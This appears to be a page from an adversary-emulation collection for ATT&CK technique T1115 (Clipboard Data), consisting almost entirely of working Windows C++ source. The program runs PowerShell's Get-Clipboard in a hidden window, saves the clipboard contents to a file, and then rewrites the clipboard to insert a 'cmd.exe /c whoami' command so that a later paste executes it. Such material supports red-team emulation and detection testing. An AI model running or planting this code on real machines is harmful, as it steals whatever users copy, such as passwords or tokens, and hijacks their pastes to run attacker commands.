---
title: "T1115.Clipboard Data"
folder: "11. Collection"
---





#include <windows.h>
#include <fstream>
#include <iostream>


void RunSystemInfoInBackground() {
    std::ofstream outputFile("Get-Clipboard.txt");
    const char* command = "powershell.exe -Command Get-Clipboard";

    SECURITY_ATTRIBUTES saAttr;
    saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
    saAttr.bInheritHandle = TRUE;
    saAttr.lpSecurityDescriptor = NULL;

    HANDLE hReadPipe, hWritePipe;
    if (!CreatePipe(&hReadPipe, &hWritePipe, &saAttr, 0)) { outputFile.close(); return; }

    STARTUPINFOA si = {};
    si.cb = sizeof(STARTUPINFOA);
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    si.hStdError = hWritePipe;
    si.hStdOutput = hWritePipe;

    PROCESS_INFORMATION pi;

    if (!CreateProcessA(NULL, const_cast<LPSTR>(command), NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) { outputFile.close(); return; }

    CloseHandle(hWritePipe);

    const int BUFFER_SIZE = 4096;
    char buffer[BUFFER_SIZE];
    DWORD bytesRead;

    while (ReadFile(hReadPipe, buffer, BUFFER_SIZE, &bytesRead, NULL) && bytesRead > 0) {
        std::string data(buffer, bytesRead);
        size_t pos = 0;

        while ((pos = data.find("\n", pos)) != std::string::npos) {
            data.erase(pos, 1);
        }

        outputFile.write(data.c_str(), data.size());
    }

    WaitForSingleObject(pi.hProcess, INFINITE);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    outputFile.close();
}


std::string GetClipboardText() {
    std::string clipboardText;
    if (OpenClipboard(nullptr)) {
        HANDLE hData = GetClipboardData(CF_TEXT);
        if (hData != nullptr) {
            char* pszText = static_cast<char*>(GlobalLock(hData));
            if (pszText != nullptr) {
                clipboardText = pszText;
                GlobalUnlock(hData);
            }
        }
        CloseClipboard();
    }
    return clipboardText;
}

void SetClipboardText(const std::string& newText) {
    if (OpenClipboard(nullptr)) {
        EmptyClipboard();
        HGLOBAL hClipboardData = GlobalAlloc(GMEM_DDESHARE, newText.size() + 1);
        if (hClipboardData != nullptr) {
            char* pszText = static_cast<char*>(GlobalLock(hClipboardData));
            if (pszText != nullptr) {
                strcpy_s(pszText, newText.size() + 1, newText.c_str());
                GlobalUnlock(hClipboardData);
                SetClipboardData(CF_TEXT, hClipboardData);
            }
        }
        CloseClipboard();
    }
}

void ModifyClipboardContent() {
    std::string clipboardText = GetClipboardText();
    size_t pos = clipboardText.find('\n');
    if (pos == std::string::npos) {
        clipboardText += "\ncmd.exe /c whoami\n \n";
    }
    else if (pos + 1 < clipboardText.size()) {
        clipboardText.insert(pos + 1, "\ncmd.exe /c whoami\n \n");
    }
    else {
        clipboardText += "\ncmd.exe /c whoami\n \n";
    }
    SetClipboardText(clipboardText);
}
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {


    RunSystemInfoInBackground();
    ModifyClipboardContent();
    return 0;
}